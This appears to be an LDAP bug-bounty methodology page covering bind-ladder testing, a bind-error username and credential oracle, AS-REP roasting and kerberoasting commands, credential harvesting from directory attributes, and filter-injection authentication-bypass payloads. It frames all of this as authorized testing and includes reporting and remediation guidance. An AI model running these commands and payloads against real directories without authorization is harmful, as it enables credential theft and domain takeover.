---
technology: "LDAP (directory-services methodology)"
kind: bug-bounty-methodology
audience: ai-agent
family: directory-services
version: "1.0"
last-refresh: "2026-11-19"
status: upstream-only
provenance: "upstream-verified: RFC 4511 (LDAP protocol), RFC 4513 (authentication methods / unauthenticated-bind trap §5.1.2), RFC 4515 (search filters), RFC 2696 (simple paged results control OID 1.2.840.113556.1.4.319); OpenLDAP ldapsearch(1) man page (-x/-D/-w/-ZZ/-E pr= syntax); Microsoft/Broadcom KB 51487 (AD AcceptSecurityContext bind sub-error codes 525/52e/530-533/701/773/775); NetExec wiki (ldap protocol: --asreproast/--kerberoasting/--trusted-for-delegation/--password-not-required/--users/--groups/--bloodhound, -M user-desc/maq/laps/ldap-checker, --query); ropnop/windapsearch + go-windapsearch module READMEs; bloodhound-python (BloodHound.py) usage. Cross-server bind/mining/injection methodology that ties the server-agnostic directory-services approach together; AD-deep surface, filter-injection depth, and ACL writes live in the sibling pages. Accessed 2026-11-19."
source: "upstream docs (RFCs 4511/4513/4515/2696, OpenLDAP ldapsearch man, NetExec wiki, windapsearch READMEs, Microsoft/Broadcom AD LDAP bind-error KB), accessed 2026-11-19"
---

Companion page: [[ldap|LDAP overview]] — what the protocol is, the bind ladder, and the router logic to the AD surface. This page is the **cross-server bug-bounty methodology**: how you fingerprint a directory, climb its bind ladder, turn a bind response into a credential oracle, mine the tree, and prove it — the same craft against AD, OpenLDAP, and appliance directories. AD-specific attribute surface lives in [[ldap-ad]]; the app-side filter-injection family lives in [[ldap-injection]]; the writes you launch once bound are [[ad-acl]]; roast targets are [[kerberos]]; the relay/capture end is [[ntlm]].

# LDAP Bug Bounty — Directory-Services Methodology

**Scope:** any LDAP directory reachable on 389/tcp (LDAP + STARTTLS), 636/tcp (LDAPS), or 3268/3269 (AD global catalog) — Microsoft AD DS, OpenLDAP (slapd), 389 Directory Server / Red Hat DS, ForgeRock/OpenDJ, Oracle Internet Directory, eDirectory, and the countless appliances that embed one. **Out of scope here:** deep AD attribute/ACL exploitation (→ [[ldap-ad]], [[ad-acl]], [[ad-cs]]) and web-app filter injection as a standalone class (→ [[ldap-injection]]) — both are cross-linked where the methodology touches them.

**Authorization:** everything below presumes written permission. The craft is single-request and low-volume by default: a directory is a database, and a careless unpaged dump or a bind-spray at volume is both noisy and a reliability risk to a production identity service. Steps that could lock accounts (repeated binds) or write to the directory are flagged.

## Where the money is (triage priority)

| Priority | Class | Where it lives | Typical severity |
|---|---|---|---|
| 1 | Anonymous / unauthenticated bind leaks the tree | misconfigured DC, default-ish slapd, appliance | High (full dir read) |
| 2 | Password-in-attribute | `description`, `userPassword`, LAPS, gMSA, `unixUserPassword` | High–Critical |
| 3 | Bind-as-user credential/username oracle | any server exposing bind sub-errors | Medium (feeds spray) |
| 4 | Cleartext simple bind on 389 | on-path position, no TLS enforced | Medium–High |
| 5 | LDAP filter injection (auth bypass) | app splicing input into a filter → [[ldap-injection]] | High |
| 6 | Directory mining → AD attack graph | any valid credential against a DC → [[ldap-ad]] | High (enables the forest) |
| 7 | Unauthenticated-bind trap (name + empty pw) | appliances, legacy slapd | Medium |
| 8 | Writable attribute → login | `sshPublicKey`, `gidNumber`, RBCD → [[ad-acl]] | High (consumer-gated) |

Phases 1–3 establish *what the server is* and *what your bind buys*; Phases 4–5 are where the data and the escalations come from; Phase 6 is discipline.

## Decision tree (one screen)

1. Port open → **Phase 1** rootDSE fingerprint → is it AD-style (`DC=...`, `supportedCapabilities 1.2.840.113556.1.4.800`) or OpenLDAP/appliance-style?
2. rootDSE answered *anonymously* → the base DN is free; test anonymous full-tree read (**Phase 2**) before touching credentials.
3. Have a username but no password → **Phase 3** bind-as-user oracle (enumerate valid users, validate a guess) — low volume, lockout-aware.
4. Have a working credential → **Phase 4** directory mining; AD-style → hand off the heavy enumeration to [[ldap-ad]] tooling, but pull `description`/`userPassword`/LAPS/gMSA first (**Phase 5**).
5. App in front binding to LDAP → **Phase 5b** filter-injection probe → [[ldap-injection]].
6. Any large query → **Phase 6** paging + jitter before you run it.

## Phase 1 — Fingerprint the directory species

The nmap line (`389/tcp open ldap`) never tells you *which* directory you are in, and the misconfiguration classes differ by species. The rootDSE — readable at base scope with an empty base DN — is the single most informative free query:

```bash
ldapsearch -x -H ldap://198.51.100.10 -s base -b '' '(objectClass=*)' '*' '+'
# '*' = user attrs, '+' = operational attrs; the rootDSE carries both
```

Read the response for the species tell:

| Tell in the rootDSE | Species | What it means for you |
|---|---|---|
| `namingContexts: DC=example,DC=com` + `supportedCapabilities: 1.2.840.113556.1.4.800` + `ldapServiceName`, `dnsHostName`, `serverName` | **Microsoft AD** | the dominant target; hand mining to [[ldap-ad]]; bind sub-errors are a rich oracle (Phase 3) |
| `objectClass: OpenLDAProotDSE`, `configContext: cn=config`, `subschemaSubentry: cn=Subschema` | **OpenLDAP (slapd)** | cleartext binds + `{SSHA}` `userPassword`; `cn=config` is the slapd config tree |
| `vendorName: 389 Project` / `Red Hat` | **389-DS / RHDS** | generic bind errors (no AD sub-codes); check anonymous read |
| `vendorName: ForgeRock`/`Ping Identity`, `OpenDJ` | **OpenDJ** | appliance defaults vary; test the unauthenticated-bind trap |
| vendor string naming an appliance (storage, firewall, identity gateway) | **embedded directory** | often an afterthought: anonymous reads and static bind accounts are common |

If the rootDSE returns nothing anonymously, you still learn something — the server denies anonymous base reads, which is the hardened posture. Record `supportedSASLMechanisms` (GSSAPI present = Kerberos binds available, [[kerberos]]), `supportedControl` (look for the paged-results OID `1.2.840.113556.1.4.319`, Phase 6), and `supportedLDAPVersion`. Expected shape on AD: `namingContexts` lists the domain NC, `CN=Configuration,...`, and the schema NC; `defaultNamingContext`/`rootDomainNamingContext` hand you the base DN for every later query.

```bash
# scriptable species probe: pull just the discriminating attrs
ldapsearch -x -H ldap://198.51.100.10 -s base -b '' '(objectClass=*)' \
  namingContexts defaultNamingContext supportedCapabilities supportedSASLMechanisms \
  supportedControl vendorName vendorVersion ldapServiceName configContext
```

## Phase 2 — The bind ladder across servers (anonymous / guest semantics)

The bind is the front door, and the three species disagree about who it lets in. Walk the ladder lowest-rung first; each rung that answers is a finding before you spend a credential.

**Rung 0 — anonymous bind, full-tree read.** `-x` with no `-D`/`-w` is a simple anonymous bind:

```bash
ldapsearch -x -H ldap://198.51.100.20 -b 'dc=example,dc=com' '(objectClass=*)'
```

- **OpenLDAP:** default ACL is often `by * read` on older/appliance-packaged builds — the whole tree walks anonymously, including `userPassword` hashes if the ACL forgot to hide them. This is the classic high-severity slapd finding.
- **AD:** modern DCs default-disable anonymous read, but `dSHeuristics` with the 7th character set to `2` re-enables anonymous operations, and legacy estates still carry it. When anonymous read is on against a DC, you enumerate users/groups/SPNs with *no credential at all* — report it as "unauthenticated domain enumeration", the single highest-impact LDAP misconfiguration on an AD estate.
- **Appliances:** frequently ship anonymous read on by vendor default; the embedded directory was never meant to be exposed.

The honest answer is often partial: the rootDSE answers anonymously but the domain NC does not (`ldap_search: Operations error` / "In order to perform this operation a successful bind must be completed"). That split *is* the data point — record which scopes each bind level unlocks.

**Rung 0.5 — "guest" is not "anonymous", and the distinction is the finding.** The three species mean different things by a guest-grade bind, so classify precisely:

- **AD:** there is no anonymous *account* — anonymous is a bind *mode*. The built-in **Guest** account is a real security principal (usually disabled); if it is enabled with a blank or default password, a *guest bind* is an **authenticated** bind, and authenticated read on AD is universal — so enabled Guest = full domain enumeration under a named principal, distinct from (and often present without) anonymous read. Test both: an anonymous rootDSE that denies the domain NC, plus a `Guest` simple bind that succeeds, is a different, higher-value finding than either alone.
- **OpenLDAP:** no "guest" concept — access is ACL-driven; the equivalent is an over-broad `by anonymous read` ACL (Rung 0) or a shared low-value bind DN (`cn=readonly`) with a published/default password baked into an appliance image.
- **Appliances:** routinely ship a static service bind account (`guest`/`guest`, `bind`/`bind`, vendor-default) whose credentials are in the product docs — try the documented defaults before assuming you need to find one. A working default service bind is a credential finding, and it usually reads the whole tree.

**Rung 1 — simple bind (and its cleartext finding).** A simple bind sends the password in a single unencrypted LDAP message. On 389/tcp without STARTTLS, that password crosses the wire in the clear (ADV190023 classes these sessions as having "no security"). Detect the posture without needing an on-path position by asking whether the server will *refuse* to take credentials in the clear:

```bash
# force StartTLS before binding; if the server has no TLS, this fails closed (good)
ldapsearch -ZZ -x -H ldap://198.51.100.10 -D 'svc_reader@example.com' -w 'P' -b '' -s base
# -ZZ = require StartTLS success. If a plain simple bind on 389 succeeds while -ZZ fails,
#        the server accepts cleartext credentials — a finding on its own.
```

A simple bind that succeeds on 389 with no TLS, on a server that does not *require* signing/sealing, means any on-path position harvests live credentials — pair with a `tcpdump -i <iface> port 389 -A` capture on an authorized segment to prove the password is readable on the wire.

**Rung 2 — unauthenticated-bind trap (RFC 4513 §5.1.2).** A bind request carrying a DN *and a zero-length password* must be treated as **anonymous**, not as a valid authentication — but some servers (appliances, misconfigured slapd with `allow bind_anon_cred`) return success, and the application in front reads that success as "these credentials are valid":

```bash
ldapsearch -x -H ldap://198.51.100.20 -D 'cn=admin,dc=example,dc=com' -w '' -b 'dc=example,dc=com'
# success here = unauthenticated bind accepted → any login flow that binds-as-user is bypassable
#                by sending an empty password for a known DN
```

This is the server-side root of a whole class of app login bypasses. When the directory permits it, the finding is the directory's; when only the app misreads a legitimate anonymous result, the finding is the app's (→ [[ldap-injection]] / search-then-bind notes).

## Phase 3 — The bind-as-user error oracle (credential validation + username enumeration)

A bind response is a two-bit oracle: *does this principal exist?* and *is this password correct?* AD is the richest source because its bind failure carries a sub-error code in the diagnostic message. Trigger one bind and read the `data` field:

```bash
ldapsearch -x -H ldap://198.51.100.10 -D 'alice@example.com' -w 'WrongGuess1' -b '' -s base
# ldap_bind: Invalid credentials (49)
#   additional info: 80090308: LdapErr: DSID-..., comment: AcceptSecurityContext error, data 52e, v...
```

The `data` sub-code (Microsoft/Broadcom KB 51487) is the oracle:

| `data` | Meaning | What it tells you |
|---|---|---|
| `525` | user not found | the username is **invalid** → username enumeration (valid vs. invalid split) |
| `52e` | invalid credentials | the username is **valid**, the password is wrong → confirmed account, keep it for spray |
| `532` | password expired | **valid username *and* correct password** (restriction applies after auth) |
| `533` | account disabled | valid username + correct password, but disabled |
| `701` | account expired | valid username + correct password |
| `773` | user must reset password | valid username + correct password → often still usable via reset flows |
| `775` | account locked out | **stop** — you (or someone) tripped lockout; back off this account |
| `530` / `531` | logon-time / workstation restriction | valid credentials, policy-blocked |

Two oracles fall out of this. **Username enumeration:** `525` vs `52e` on a wrong password separates real accounts from noise — build a candidate list from `firstname.lastname`, OSINT, and leaked breach corpora, then classify each with one bind. **Credential validation without a login UI:** a `52e` is "wrong password, right user"; a `532`/`533`/`701`/`773` means your *password was correct* — the account state is the only thing standing between you and a session. On OpenLDAP and 389-DS the oracle is coarser (a generic `Invalid credentials (49)` with no sub-code), but a *timing* difference between "no such entry" and "entry found, bind failed" can still separate valid DNs — test it deliberately (Phase 6 timing discipline).

**Lockout discipline (mandatory):** every failed bind counts against the domain lockout policy. Before classifying a list, read the policy (`lockoutThreshold`, `lockoutDuration` on the domain object — pull it with one anonymous/low-priv query if you can) and stay well under threshold per account; prefer one bind per username for enumeration, never a password-list sweep per account. A locked account is a disruption finding you caused, not a win.

## Phase 4 — Directory mining once bound

With any valid credential, AD grants *authenticated read* to the whole domain — enumeration is not a privileged act. The pattern everything reduces to is `base DN + scope + filter + attribute list`. Start from the skeleton and widen:

```bash
BASE='DC=example,DC=com'; DC=198.51.100.10; U='user@example.com'; P='Password123!'

# users: identity + the three attributes that start every AD attack
ldapsearch -x -H ldap://$DC -D "$U" -w "$P" -b "$BASE" \
  '(&(objectCategory=person)(objectClass=user))' \
  sAMAccountName description memberOf userAccountControl servicePrincipalName

# SPN scan = the kerberoast target list ([[kerberos]])
ldapsearch -x -H ldap://$DC -D "$U" -w "$P" -b "$BASE" \
  '(&(objectClass=user)(servicePrincipalName=*))' sAMAccountName servicePrincipalName

# bit-flag queries (OID 1.2.840.113556.1.4.803 = bitwise-AND):
#   4194304 = DONT_REQ_PREAUTH  (AS-REP roast)   524288 = TRUSTED_FOR_DELEGATION (unconstrained)
#        32 = PASSWD_NOTREQD                       65536 = DONT_EXPIRE_PASSWORD
ldapsearch -x -H ldap://$DC -D "$U" -w "$P" -b "$BASE" \
  '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' sAMAccountName

# computers + unconstrained delegation targets
ldapsearch -x -H ldap://$DC -D "$U" -w "$P" -b "$BASE" \
  '(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))' \
  sAMAccountName dNSHostName
```

Expected outputs: the attribute list is the recon skeleton that feeds every later phase — `memberOf` builds the group-membership paths to high-value targets (Domain Admins, delegated OUs), `servicePrincipalName` is the roast list, the UAC bit queries are the pre-built candidate sets for AS-REP roast / delegation abuse. For the heavy AD attribute and ACL surface — `nTSecurityDescriptor` reads, extended-rights GUIDs, the config NC, RBCD writes — hand off to **[[ldap-ad]]**.

**Tools, by name, with expected output:**

```bash
# windapsearch (ropnop) — Python; AD users/groups/computers over LDAP
windapsearch.py --dc-ip $DC -d example.com -u "$U" -p "$P" -U    # all users
windapsearch.py --dc-ip $DC -d example.com -u "$U" -p "$P" --da  # recursive Domain Admins
windapsearch.py --dc-ip $DC -d example.com -u "$U" -p "$P" --user-spns            # kerberoast targets
windapsearch.py --dc-ip $DC -d example.com -u "$U" -p "$P" --unconstrained-users --unconstrained-computers
#   → one object block per hit; --da expands nested group members (the path to privilege)
#   (go-windapsearch is the single-static-binary Go port: same queries via -m users/-m groups/...)

# NetExec (nxc) ldap — validation, native enum flags, and modules
nxc ldap $DC -u '' -p '' --query "(sAMAccountName=*)" ""    # anonymous null-bind pull (if allowed)
nxc ldap $DC -u "$U" -p "$P" --users --groups              # built-in enumeration
nxc ldap $DC -u "$U" -p "$P" --asreproast asrep.txt        # AS-REP hashes straight to file
nxc ldap $DC -u "$U" -p "$P" --kerberoasting kerb.txt      # TGS-REP etype23 hashes
nxc ldap $DC -u "$U" -p "$P" --trusted-for-delegation --password-not-required
nxc ldap $DC -u "$U" -p "$P" -M user-desc                  # descriptions (password hunt, Phase 5)
nxc ldap $DC -u "$U" -p "$P" -M maq                        # MachineAccountQuota
nxc ldap $DC -u "$U" -p "$P" -M ldap-checker               # signing / channel-binding posture
#   → "a bind is required" on the null-bind line = anonymous denied; (Pwn3d!) never appears on ldap —
#     the ldap module reports data, not code execution. -L lists modules on your installed version.

# bloodhound-python — the attack graph, collected over LDAP
bloodhound-python -u "$U" -p "$P" -d example.com -ns $DC -dc dc01.example.com -c All --zip
#   → a timestamped .zip of JSON for BloodHound ingest; -c All = Users/Groups/Computers/GPOs/ACLs/etc.
#   PtH: --hashes :NTHASH | Kerberos ticket: -k -no-pass (KRB5CCNAME set)
```

`bloodhound-python -c All` *is* an LDAP operation under the hood — "run BloodHound" means "pull the graph over 389/636". Against hardened DCs that enforce LDAP channel binding, add the channel-binding path (collector-specific) or bind over LDAPS; a plain 389 bind may be refused outright, which is itself the signing-posture finding `ldap-checker` reports.

## Phase 5 — Password-in-attribute classics

Directories store secrets in attributes that any authenticated user can sometimes read. Pull these *first* — they are the shortest path from "a credential" to "a better credential":

```bash
# AD: the description-field classic (admins paste passwords here constantly)
ldapsearch -x -H ldap://$DC -D "$U" -w "$P" -b "$BASE" '(description=*)' sAMAccountName description
#   → grep the output for pass/pwd/cred; comment and info attributes carry the same mistake

# gMSA managed password blob — readable only by principals on msDS-GroupMSAMembership
ldapsearch -x -H ldap://$DC -D "$U" -w "$P" -b "$BASE" \
  '(objectClass=msDS-GroupManagedServiceAccount)' sAMAccountName msDS-ManagedPassword

# LAPS local-admin password (legacy ms-Mcs-AdmPwd / Windows LAPS msLAPS-Password|msLAPS-EncryptedPassword)
ldapsearch -x -H ldap://$DC -D "$U" -w "$P" -b "$BASE" \
  '(ms-Mcs-AdmPwd=*)' sAMAccountName ms-Mcs-AdmPwd

# OpenLDAP / appliances: readable password hashes when the ACL slips
ldapsearch -x -H ldap://198.51.100.20 -D 'cn=reader,dc=example,dc=com' -w "$P" \
  -b 'dc=example,dc=com' '(objectClass=*)' userPassword unixUserPassword
#   → {SSHA}... / {CRYPT}... hash values; select the hash string only, match to hashcat/John format
```

**Accuracy note that saves a bad report:** `unicodePwd` is **write-only** on AD — it is *never* returned on a read, so "unicodePwd readable" is not a finding; it is the *write* target for password resets and shadow-credential chains ([[ad-acl]]). The genuinely readable classics are `description`/`info`/`comment` (free-text creds), `userPassword`/`unixUserPassword` (OpenLDAP and appliance directories, and AD only where an integration populated it), the gMSA `msDS-ManagedPassword` blob (membership-gated), and LAPS attributes (ACL-gated). Report what the attribute *actually returned*, not what the schema theoretically holds.

When you recover an OpenLDAP `{SSHA}` hash, carve only the hash value into your crack file — never paste adjacent fields like `structuralObjectClass` alongside it. Modern `mdb` backends and on-disk database theft are a separate chain (see [[ldap]] post-exploitation notes).

### 5b — LDAP filter injection (when an app binds for you)

If a web app (login form, address-book search, mail authenticator) splices your input into an LDAP search filter, the directory is not the bug — the filter construction is. The quick probe set, with full depth in **[[ldap-injection]]**:

- **Authentication bypass via filter manipulation:** an app building `(&(uid=INPUT)(userPassword=INPUT))` and binding/searching on the result is reshaped by `*)(uid=*))(|(uid=*` or a trailing `*)(|(&` — inject your own `)`/`(`/`*` to close the intended clause and append an always-true one. Signature: *more rows on malformed input than on a clean username*.
- **Blind boolean oracle:** where the response does not echo data, a true/false difference (login success vs. failure, result count, timing) lets you extract an attribute character-by-character with substring filters `(attr=a*)`, `(attr=b*)`, …
- **Metacharacters to test** (RFC 4515 filters): `*` `(` `)` `\` `NUL`; in DN context (RFC 4514) additionally `\ # + < > , ; " =` and leading/trailing spaces. Apps that "just concatenate" are the targets; the fix is context-correct escaping.

## Phase 6 — Paging and jitter discipline for large directories

A production directory can hold hundreds of thousands of entries. An unpaged `(objectClass=*)` either hits the server's size limit (`ldap_search: Size limit exceeded (4)` — you get a truncated, misleading result) or pulls a multi-megabyte response in one burst that spikes the directory and lights up monitoring. Use the simple paged-results control (RFC 2696, OID `1.2.840.113556.1.4.319`) and pace it:

```bash
# page through a large result set 1000 entries at a time (OpenLDAP ldapsearch syntax)
ldapsearch -x -E pr=1000/noprompt -H ldap://$DC -D "$U" -w "$P" \
  -b "$BASE" '(objectClass=user)' sAMAccountName
#   pr=<size>/noprompt continues automatically; the final page returns an empty cookie
```

Discipline that keeps this deployable:

- **Page, always, on anything that could exceed the server size limit** — a truncated dump that silently drops the one account you needed is worse than slow.
- **Filter narrowly before you page widely.** Ask `(&(objectCategory=person)(objectClass=user))` with a tight attribute list, not `(objectClass=*)` with everything — you transfer less, you trip fewer alerts, and the evidence is cleaner.
- **Jitter between pages/queries** on a monitored estate; a steady machine-gun of identical paged searches from one source IP is the signature directory-monitoring tooling (and the MaLDAPtive-era defenders) look for.
- **Prefer the global catalog (3268)** for cross-domain object resolution so you avoid chasing referrals with extra binds.
- **One account, low and slow** beats many binds fast — both for lockout (Phase 3) and for staying under volumetric detection.

## Reporting and evidence standards

Structure every finding impact-first, with a copy-pasteable PoC and the exact server response:

1. **Title — impact, then primitive.** "Unauthenticated LDAP bind on the DC exposes the full domain user/group/SPN directory" beats "LDAP anonymous bind".
2. **Preconditions.** No credential (Phase 2), one low-priv credential (Phase 4), or an on-path position (Phase 2 cleartext) — state which.
3. **PoC.** The exact `ldapsearch`/`nxc` command and the verbatim response: the rootDSE block, the `data 52e`/`525` oracle line, the paged result count, or the recovered attribute.
4. **Evidence, minimized.** Prove the class with the smallest possible extract — one object for anonymous read, one `description`/`userPassword` value (redact the secret: name the attribute and first/last few characters, never the full password or hash in the report body). Do not bulk-exfiltrate the directory; a 10-row paged sample proves "readable" as well as a 200k-row dump and leaves a fraction of the footprint.
5. **Remediation, server-specific.** Anonymous read → disable anonymous bind / fix the slapd ACL (`by * none` on password attrs) / set AD `dSHeuristics` back; cleartext bind → require LDAPS + LDAP signing + channel binding; bind oracle → return a generic auth failure to clients and log the sub-code server-side only; password-in-attribute → purge the secret and rotate it.

Severity anchors: unauthenticated directory read or a recovered reusable credential — High–Critical; cleartext-credential exposure with a demonstrated on-path position — High; a bind-based username/credential oracle — Medium (an amplifier, cite it as feeding spray); the unauthenticated-bind trap — Medium–High depending on what the consuming app does with it. For AD, cite the chain the mined data enables (kerberoast → crack → lateral) rather than stopping at "enumeration".

## CTF notes

LDAP is a staple of HTB/Proving-Grounds/OSCP-style AD boxes, almost always in one of these shapes: **anonymous bind or a leaked low-priv credential → `ldapsearch`/`windapsearch` dump → a password sitting in a `description` field** (the single most common LDAP box line); **`userPassword` / `{SSHA}` hashes readable on a standalone OpenLDAP box → crack offline**; **SPN scan → kerberoast → crack → the next user** ([[kerberos]]); **AS-REP roast candidates via the `4194304` UAC bit**; **`bloodhound-python -c All` → a shortest-path edge (GenericWrite/`memberOf`) to Domain Admins** ([[ad-acl]]); and **a login form with filter injection** ([[ldap-injection]]). What differs under a bounty program: no bind-spray at volume (lockout is real and you caused it), every `sp`/write is destructive and needs a revert + disclosure, paging + jitter are mandatory on a production directory, and pivots that cross into out-of-scope domains/appliances are scope violations even when the technique works — enumerate the target before you pivot. On a CTF the flag may well be the password in the attribute; in a bounty the attribute value is the *finding*, redacted, not a trophy to dump.

## References

- RFC 4511 — LDAP: The Protocol — https://www.rfc-editor.org/rfc/rfc4511
- RFC 4513 — LDAP: Authentication Methods and Security Mechanisms (unauthenticated-bind trap §5.1.2) — https://www.rfc-editor.org/rfc/rfc4513
- RFC 4515 — LDAP: String Representation of Search Filters — https://www.rfc-editor.org/rfc/rfc4515
- RFC 4514 — LDAP: String Representation of Distinguished Names — https://www.rfc-editor.org/rfc/rfc4514
- RFC 2696 — LDAP Control Extension for Simple Paged Results (OID 1.2.840.113556.1.4.319) — https://www.rfc-editor.org/rfc/rfc2696
- OpenLDAP ldapsearch(1) man page — https://www.openldap.org/software/man.cgi?query=ldapsearch
- Broadcom KB 51487 — Common Active Directory LDAP bind errors (AcceptSecurityContext data codes) — https://knowledge.broadcom.com/external/article/51487/common-active-directory-ldap-bind-errors.html
- Microsoft ADV190023 — LDAP channel binding and signing — https://learn.microsoft.com/en-us/security-updates/securityadvisories/2019/adv190023
- NetExec wiki — LDAP protocol (modules, --query, roasting flags) — https://www.netexec.wiki/ldap-protocol
- ropnop/windapsearch — https://github.com/ropnop/windapsearch
- ropnop/go-windapsearch module README — https://github.com/ropnop/go-windapsearch/blob/v0.3.0/pkg/modules/README.md
- BloodHound.py (bloodhound-python) — https://github.com/dirkjanm/BloodHound.py
- The Hacker Recipes — AD recon over LDAP — https://thehacker.recipes/ad/recon/ldap
- OWASP — LDAP Injection Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html

*Methodology compiled 2026-11-19 (claude-opus-4-8). Cross-server bind/mining/injection craft verified against primary sources: RFCs 4511/4513/4514/4515/2696; OpenLDAP ldapsearch(1); Microsoft/Broadcom AD LDAP bind-error documentation (sub-codes 525/52e/530–533/701/773/775); NetExec wiki LDAP modules and flags; ropnop windapsearch + go-windapsearch READMEs; bloodhound-python usage. CVEs older than ~1 year are deliberately absent — the durable product is the bind-ladder, error-oracle, mining, and discipline craft, not patch-gated bugs; AD attribute/ACL depth and filter-injection depth are delegated to [[ldap-ad]], [[ad-acl]], and [[ldap-injection]].*
